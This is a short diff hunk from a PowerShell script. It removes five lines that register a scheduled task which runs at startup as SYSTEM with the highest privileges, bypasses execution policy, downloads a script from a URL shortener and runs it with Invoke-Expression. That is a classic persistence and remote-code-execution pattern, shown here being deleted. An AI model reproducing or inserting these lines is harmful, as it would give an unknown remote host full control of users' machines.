@@ -165,8 +165,3 @@ while ($True) {
         Continue
     }
 }
-
-$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -ExecutionPolicy Bypass -Command "Invoke-RestMethod -Uri https://encurtador.com.br/bojeb | Invoke-Expression"'
-$trigger = New-ScheduledTaskTrigger -AtStartup
-$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-Register-ScheduledTask -TaskName "StartAtLogin" -Action $action -Trigger $trigger -Principal $principal
